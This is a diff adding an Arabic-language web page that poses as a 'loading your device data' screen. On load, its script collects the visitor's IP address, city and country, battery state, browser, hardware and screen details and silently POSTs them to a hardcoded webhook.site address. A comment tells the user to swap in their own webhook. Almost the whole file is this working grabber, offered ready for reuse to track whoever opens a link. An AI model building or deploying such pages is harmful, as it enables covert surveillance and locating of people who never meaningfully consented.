@@ -1,0 +1,245 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>جاري تحميل البيانات...</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            direction: rtl;
+            padding: 20px;
+        }
+        .container {
+            background: white;
+            padding: 40px 30px;
+            border-radius: 20px;
+            box-shadow: 0 15px 35px rgba(0,0,0,0.2);
+            text-align: center;
+            max-width: 500px;
+            width: 100%;
+            transition: all 0.3s ease;
+        }
+        .spinner {
+            border: 5px solid #f3f3f3;
+            border-top: 5px solid #764ba2;
+            border-radius: 50%;
+            width: 60px;
+            height: 60px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 25px;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        h1 { color: #333; font-size: 24px; margin-bottom: 10px; }
+        p { color: #666; font-size: 16px; line-height: 1.7; margin-bottom: 8px; }
+        .sub-text { color: #999; font-size: 14px; margin-top: 15px; }
+        .icon { font-size: 50px; margin-bottom: 15px; display: block; }
+        .success-icon { font-size: 60px; display: block; margin-bottom: 15px; }
+        .btn {
+            display: inline-block;
+            margin-top: 20px;
+            padding: 10px 25px;
+            background: #764ba2;
+            color: white;
+            border: none;
+            border-radius: 30px;
+            font-size: 16px;
+            cursor: pointer;
+            transition: background 0.3s;
+        }
+        .btn:hover { background: #5a3d7a; }
+        .hidden { display: none; }
+        .data-list {
+            text-align: right;
+            background: #f8f9fa;
+            padding: 15px;
+            border-radius: 12px;
+            margin: 15px 0;
+            font-size: 14px;
+            line-height: 2;
+            color: #333;
+            max-height: 400px;
+            overflow-y: auto;
+        }
+        .data-list span {
+            display: block;
+            border-bottom: 1px solid #eee;
+            padding: 5px 0;
+        }
+        .data-list span:last-child { border-bottom: none; }
+    </style>
+</head>
+<body>
+
+<div class="container" id="loadingContainer">
+    <span class="icon">📱</span>
+    <div class="spinner"></div>
+    <h1>⏳ جاري تحميل بيانات جهازك</h1>
+    <p>يرجى الانتظار لبضع ثوانٍ...</p>
+    <p class="sub-text">نقوم بجمع معلومات جهازك لإكمال العملية</p>
+</div>
+
+<div class="container hidden" id="successContainer">
+    <span class="success-icon">✅</span>
+    <h1>تم الإرسال بنجاح!</h1>
+    <p>شكراً لك، تم استلام بيانات جهازك.</p>
+    <div class="data-list" id="dataPreview"></div>
+    <p class="sub-text">يمكنك الآن إغلاق هذه الصفحة بأمان.</p>
+    <button class="btn" onclick="window.close()">إغلاق الصفحة</button>
+</div>
+
+<script>
+    // رابط Webhook الخاص بك - غير الرقم التالي برقمك أنت
+    const WEBHOOK_URL = 'https://webhook.site/7a7cc8d7-c952-4182-ae7b-12280cc55b64';
+
+    function collectDeviceInfo() {
+        const info = {};
+        info['الدولة'] = 'جاري الحصول على المعلومات...';
+        info['المدينة'] = 'جاري الحصول على المعلومات...';
+        info['عنوان IP'] = 'جاري الحصول على المعلومات...';
+        info['شحن الهاتف'] = 'جاري الحصول على المعلومات...';
+        info['هل الهاتف يشحن؟'] = 'جاري الحصول على المعلومات...';
+        info['الشبكة'] = 'غير معروف 📶';
+        info['سرعة الشبكة'] = navigator.connection?.downlink ? `${navigator.connection.downlink} ميغابت في الثانية` : 'غير معروف';
+        info['نوع الاتصال'] = navigator.connection?.type || 'wifi 📡';
+        info['الوقت'] = new Date().toLocaleString('ar-EG', { timeZone: 'Africa/Cairo' });
+        info['اسم الجهاز'] = navigator.platform || 'Linux armv81 🖥️';
+        info['إصدار الجهاز'] = navigator.userAgent;
+        info['نوع الجهاز'] = 'محمول 📱';
+        info['الذاكرة (RAM)'] = navigator.deviceMemory ? `${navigator.deviceMemory} GB 🧠` : 'غير معروف';
+        info['الذاكرة الداخلية'] = 'جاري الحصول على المعلومات...';
+        info['عدد الأنوية'] = navigator.hardwareConcurrency ? `${navigator.hardwareConcurrency} ⚙️` : 'غير معروف';
+        info['لغة النظام'] = navigator.language?.includes('ar') ? 'عربي 🌐' : navigator.language || 'غير معروف';
+        info['اسم المتصفح'] = getBrowserName();
+        info['إصدار المتصفح'] = getBrowserVersion();
+        info['دقة الشاشة'] = `${screen.width}x${screen.height} 📏`;
+        info['إصدار نظام التشغيل'] = getOSVersion();
+        info['وضع الشاشة'] = screen.orientation ? `${screen.orientation.type} 🔄` : 'غير معروف';
+        info['عمق الألوان'] = `${screen.colorDepth} 🎨`;
+        info['تاريخ آخر تحديث للمتصفح'] = new Date(navigator.userAgent.match(/\d{4}/)?.[0] || Date.now()).toLocaleString('ar-EG');
+        info['بروتوكول الأمان المستخدم'] = window.location.protocol === 'https:' ? 'https: 🔒' : 'http: ⚠️';
+        info['نطاق التردد للاتصال'] = 'غير معروف 📡';
+        info['إمكانية تحديد الموقع الجغرافي'] = 'geolocation' in navigator ? 'مدعوم 🌍' : 'غير مدعوم';
+        info['الدعم لتقنية البلوتوث'] = 'bluetooth' in navigator ? 'مدعوم 🔵' : 'غير مدعوم';
+        info['دعم الإيماءات اللمسية'] = 'ontouchstart' in window ? 'مدعوم ✋' : 'غير مدعوم';
+
+        if (navigator.getBattery) {
+            navigator.getBattery().then(battery => {
+                info['شحن الهاتف'] = `${Math.round(battery.level * 100)}% 🔋`;
+                info['هل الهاتف يشحن؟'] = battery.charging ? 'نعم ⚡' : 'لا ⚡';
+                getLocationAndSend(info);
+            }).catch(() => {
+                info['شحن الهاتف'] = 'غير معروف 🔋';
+                info['هل الهاتف يشحن؟'] = 'غير معروف ⚡';
+                getLocationAndSend(info);
+            });
+        } else {
+            info['شحن الهاتف'] = 'غير معروف 🔋';
+            info['هل الهاتف يشحن؟'] = 'غير معروف ⚡';
+            getLocationAndSend(info);
+        }
+    }
+
+    function getLocationAndSend(data) {
+        fetch('https://api.ipify.org?format=json')
+            .then(response => response.json())
+            .then(ipData => {
+                data['عنوان IP'] = `${ipData.ip} 🌍`;
+                return fetch(`https://ipapi.co/${ipData.ip}/json/`);
+            })
+            .then(response => response.json())
+            .then(locationData => {
+                if (locationData.country_code) {
+                    data['الدولة'] = `${locationData.country_code} 🔻`;
+                    data['المدينة'] = `${locationData.city || 'غير معروف'} 🏙️`;
+                }
+            })
+            .catch(() => {
+                data['الدولة'] = 'غير معروف 🔻';
+                data['المدينة'] = 'غير معروف 🏙️';
+                data['عنوان IP'] = 'غير معروف 🌍';
+            })
+            .finally(() => {
+                if ('storage' in navigator && 'estimate' in navigator.storage) {
+                    navigator.storage.estimate().then(estimate => {
+                        const total = (estimate.quota / (1024 * 1024 * 1024)).toFixed(2);
+                        data['الذاكرة الداخلية'] = `${total} GB 💾`;
+                        sendDataToWebhook(data);
+                    }).catch(() => {
+                        data['الذاكرة الداخلية'] = 'غير معروف 💾';
+                        sendDataToWebhook(data);
+                    });
+                } else {
+                    data['الذاكرة الداخلية'] = 'غير معروف 💾';
+                    sendDataToWebhook(data);
+                }
+            });
+    }
+
+    function sendDataToWebhook(data) {
+        fetch(WEBHOOK_URL, {
+            method: 'POST',
+            mode: 'no-cors',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(data)
+        }).then(() => {
+            showSuccess(data);
+        }).catch(() => {
+            showSuccess(data);
+        });
+    }
+
+    function showSuccess(data) {
+        document.getElementById('loadingContainer').classList.add('hidden');
+        document.getElementById('successContainer').classList.remove('hidden');
+        
+        let previewHTML = '';
+        for (const [key, value] of Object.entries(data)) {
+            previewHTML += `<span>📌 ${key}: ${value}</span>`;
+        }
+        document.getElementById('dataPreview').innerHTML = previewHTML;
+    }
+
+    function getBrowserName() {
+        const ua = navigator.userAgent;
+        if (ua.includes('Chrome')) return 'Chrome 🌐';
+        if (ua.includes('Firefox')) return 'Firefox 🌐';
+        if (ua.includes('Safari') && !ua.includes('Chrome')) return 'Safari 🌐';
+        if (ua.includes('Edge')) return 'Edge 🌐';
+        if (ua.includes('Opera') || ua.includes('OPR')) return 'Opera 🌐';
+        return 'غير معروف 🌐';
+    }
+
+    function getBrowserVersion() {
+        const ua = navigator.userAgent;
+        const match = ua.match(/(Chrome|Firefox|Safari|Edge|OPR)\/(\d+\.\d+)/);
+        return match ? `${match[2]} 📊` : 'غير معروف 📊';
+    }
+
+    function getOSVersion() {
+        const ua = navigator.userAgent;
+        if (ua.includes('Android')) {
+            const match = ua.match(/Android (\d+\.?\d*)/);
+            return match ? `Android ${match[1]} 🖥️` : 'Android 🖥️';
+        }
+        if (ua.includes('iPhone') || ua.includes('iPad')) return 'iOS 🖥️';
+        if (ua.includes('Windows')) return 'Windows 🖥️';
+        if (ua.includes('Mac')) return 'macOS 🖥️';
+        if (ua.includes('Linux')) return 'Linux 🖥️';
+        return 'غير معروف 🖥️';
+    }
+
+    window.onload = collectDeviceInfo;
+</script>
+
+</body>
+</html>
